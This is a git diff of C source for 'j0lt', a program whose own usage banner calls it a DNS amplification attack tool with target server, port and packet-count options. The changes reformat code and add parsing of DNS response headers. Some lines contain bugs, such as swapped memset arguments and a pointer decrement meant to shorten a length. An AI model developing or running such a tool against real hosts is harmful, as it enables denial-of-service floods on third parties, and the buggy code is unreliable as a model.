@@ -142,9 +142,9 @@ typedef enum __class__ {
 #define     QCLASS C_IN
 // END CLASS 
 
-#define DEFINE_INSERT_FN(typename, datatype)        \
+#define DEFINE_INSERT_FN(typename, datatype)		\
     bool insert_##typename                          \
-    (uint8_t** buf, size_t* buflen, datatype data)  \
+    (uint8_t** buf, size_t* buflen, datatype data)	\
     {                                               \
 	uint64_t msb_mask, lsb_mask,                    \
 	    bigendian_data, lsb, msb;                   \
@@ -192,22 +192,21 @@ DEFINE_INSERT_FN(qword, uint64_t)
 
 #define 	DEBUG   1
 #define 	BUF_MAX 0x200
-
 const char* g_ansi = {
- " Usage: sudo ./j0lt [OPTION]...          \n"
- "                                         \n"
- "-d <dst>        : target server          \n"
- "-p <port>       : target port            \n"
- "-n <num>        : num UDP packets to send\n"
- "-r <dns rcrd>   : list of dns records    \n"
- "-s <dns srv>    : list of dns servers    \n"
- "-P <dns port>   : dns port (53)          \n"
- "                                         \n"
- " w3lc0m3 t0 j0lt                         \n"
- " a DNS amplification attack tool         \n"
- "                                         \n"
- "                            the-scientist\n"
- "                       tofu@rootstorm.com\n\n"
+    " Usage: sudo ./j0lt [OPTION]...          \n"
+    "                                         \n"
+    "-d <dst>        : target server          \n"
+    "-p <port>       : target port            \n"
+    "-n <num>        : num UDP packets to send\n"
+    "-r <dns rcrd>   : list of dns records    \n"
+    "-s <dns srv>    : list of dns servers    \n"
+    "-P <dns port>   : dns port (53)          \n"
+    "                                         \n"
+    " w3lc0m3 t0 j0lt                         \n"
+    " a DNS amplification attack tool         \n"
+    "                                         \n"
+    "                            the-scientist\n"
+    "                       tofu@rootstorm.com\n\n"
 };
 
 int
@@ -226,21 +225,31 @@ insert_header(uint8_t** buf, size_t* buflen,
           const struct J0LT_HEADER* header);
 bool
 create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
-          const struct J0LT_HEADER* header,
-          const char* domain,
-          uint16_t query_type,
-          uint16_t query_class);
+            const struct J0LT_HEADER* header,
+            const char* domain,
+            uint16_t query_type,
+            uint16_t query_class);
+
+bool
+retrieve_dns_packet(uint8_t recvbuf[ ], size_t* buflen,
+                    struct J0LT_HEADER* recvheader);
+uint16_t
+remove_word(uint8_t** buf, size_t* buflen);
+uint8_t
+remove_byte(uint8_t** buf, size_t* buflen);
+
 int
 main(int argc, char** argv)
 {
     struct sockaddr_in addr, srcaddr;
+    socklen_t srcaddrlen;
     int sockfd;
-    size_t buflen = BUF_MAX;
+
+    size_t buflen, recvlen;
     uint8_t pktbuf[ BUF_MAX ];
     uint8_t recvbuf[ BUF_MAX ];
-    socklen_t srcaddrlen;
-
-    struct J0LT_HEADER header = {
+    struct J0LT_HEADER recvheader;
+    struct J0LT_HEADER sndheader = {
         ID,
         RD, TC, AA, OPCODE, QR,
         RCODE, CD, AD, Z, RA,
@@ -253,33 +262,34 @@ main(int argc, char** argv)
     printf("%s", g_ansi);
 
 #if DEBUG
-    printf("ID: %.4x\n\n", header.id);
+    puts("SEND HEADER");
+    printf("ID: %.4x\n\n", sndheader.id);
 
-    printf("rd: 0x%x\n", header.rd);
-    printf("tc: 0x%x\n", header.tc);
-    printf("aa: 0x%x\n", header.aa);
-    printf("op: 0x%x\n", header.opcode);
-    printf("qr: 0x%x\n", header.qr);
-    printf("rc: 0x%x\n", header.rcode);
-    printf("cd: 0x%x\n", header.cd);
-    printf("ad: 0x%x\n", header.ad);
-    printf("z : 0x%x\n", header.z);
-    printf("ra: 0x%x\n\n", header.ra);
+    printf("rd: 0x%x\n", sndheader.rd);
+    printf("tc: 0x%x\n", sndheader.tc);
+    printf("aa: 0x%x\n", sndheader.aa);
+    printf("op: 0x%x\n", sndheader.opcode);
+    printf("qr: 0x%x\n", sndheader.qr);
+    printf("rc: 0x%x\n", sndheader.rcode);
+    printf("cd: 0x%x\n", sndheader.cd);
+    printf("ad: 0x%x\n", sndheader.ad);
+    printf("z : 0x%x\n", sndheader.z);
+    printf("ra: 0x%x\n\n", sndheader.ra);
 
-    printf("QDCOUNT: 0x%.4x\n", header.qdcount);
-    printf("ANCOUNT: 0x%.4x\n", header.ancount);
-    printf("NSCOUNT: 0x%.4x\n", header.nscount);
-    printf("ARCOUNT: 0x%.4x\n", header.arcount);
-
+    printf("QDCOUNT: 0x%.4x\n", sndheader.qdcount);
+    printf("ANCOUNT: 0x%.4x\n", sndheader.ancount);
+    printf("NSCOUNT: 0x%.4x\n", sndheader.nscount);
+    printf("ARCOUNT: 0x%.4x\n\n", sndheader.arcount);
 #endif // DEBUG
 
     if (argc != 4) {
         goto fail_state;
     }
 
+    buflen = BUF_MAX;
     memset(pktbuf, BUF_MAX, 0);
     if (create_dns_packet(pktbuf, &buflen,
-        &header, argv[ 3 ],
+        &sndheader, argv[ 3 ],
         QTYPE, QCLASS) == false) {
         fprintf(stderr, "create_dns_packet error\n");
         goto fail_state;
@@ -296,14 +306,98 @@ main(int argc, char** argv)
        sizeof(addr));
 
     memset(recvbuf, 0, BUF_MAX);
-    recvfrom(sockfd, recvbuf, BUF_MAX - 1, 0,
-    ( struct sockaddr* ) &srcaddr, &srcaddrlen);
+    recvlen = recvfrom(sockfd, recvbuf, BUF_MAX - 1, 0,
+         ( struct sockaddr* ) &srcaddr, &srcaddrlen);
+
+    if (recvlen == -1) {
+        perror("recvfrom");
+        goto fail_fd;
+    }
+
+    retrieve_dns_packet(recvbuf, &recvlen, &recvheader);
+
+#if DEBUG
+    puts("RECV HEADER");
+    printf("ID: %.4x\n\n", recvheader.id);
+
+    printf("rd: 0x%x\n", recvheader.rd);
+    printf("tc: 0x%x\n", recvheader.tc);
+    printf("aa: 0x%x\n", recvheader.aa);
+    printf("op: 0x%x\n", recvheader.opcode);
+    printf("qr: 0x%x\n", recvheader.qr);
+    printf("rc: 0x%x\n", recvheader.rcode);
+    printf("cd: 0x%x\n", recvheader.cd);
+    printf("ad: 0x%x\n", recvheader.ad);
+    printf("z : 0x%x\n", recvheader.z);
+    printf("ra: 0x%x\n\n", recvheader.ra);
+
+    printf("QDCOUNT: 0x%.4x\n", recvheader.qdcount);
+    printf("ANCOUNT: 0x%.4x\n", recvheader.ancount);
+    printf("NSCOUNT: 0x%.4x\n", recvheader.nscount);
+    printf("ARCOUNT: 0x%.4x\n", recvheader.arcount);
+#endif // DEBUG
+
     close(sockfd);
-
     return 0;
-
+fail_fd:
+    close(sockfd);
 fail_state:
     exit(EXIT_FAILURE);
+}
+
+bool
+retrieve_dns_packet(uint8_t recvbuf[ ], size_t* buflen,
+                    struct J0LT_HEADER* recvheader)
+{
+    uint8_t* curpos = recvbuf;
+    size_t stepsz;
+
+    stepsz = sizeof(struct J0LT_HEADER);
+    if (stepsz > *buflen) {
+        return false;
+    }
+
+    memcpy(recvheader, ( struct J0LT_HEADER* ) curpos, stepsz);
+    recvheader->id = ntohs(recvheader->id);
+    recvheader->qdcount = ntohs(recvheader->qdcount);
+    recvheader->ancount = ntohs(recvheader->ancount);
+    recvheader->nscount = ntohs(recvheader->nscount);
+    recvheader->arcount = ntohs(recvheader->arcount);
+    curpos += stepsz;
+    *buflen -= stepsz;
+
+    return true;
+}
+
+uint8_t
+remove_byte(uint8_t** buf, size_t* buflen)
+{
+    uint8_t retval;
+    if (*buflen < 1) {
+        return -1;
+    }
+
+    retval = *(*buf)++;
+    *buflen--;
+
+    return retval;
+}
+
+uint16_t
+remove_word(uint8_t** buf, size_t* buflen)
+{
+    uint16_t retval;
+
+    if (*buflen < 2) {
+        return -1;
+    }
+
+    retval = *(*buf)++ << 8;
+    retval |= *(*buf)++;
+
+    *buflen -= 2;
+
+    return retval;
 }
 
 bool
@@ -332,20 +426,20 @@ insert_header(uint8_t** buf, size_t*
     uint8_t third_byte, fourth_byte;
 
     third_byte = (
-                    header->rd |
-                    header->tc << 1 |
-                    header->aa << 2 |
-                    header->opcode << 3 |
-                    header->qr << 7
-                );
+        header->rd |
+        header->tc << 1 |
+        header->aa << 2 |
+        header->opcode << 3 |
+        header->qr << 7
+    );
 
     fourth_byte = (
-                    header->rcode |
-                    header->cd << 4 |
-                    header->ad << 5 |
-                    header->z << 6 |
-                    header->ra << 7
-                );
+        header->rcode |
+        header->cd << 4 |
+        header->ad << 5 |
+        header->z << 6 |
+        header->ra << 7
+    );
 
     status = true;
     status &= insert_word(buf, buflen, header->id);
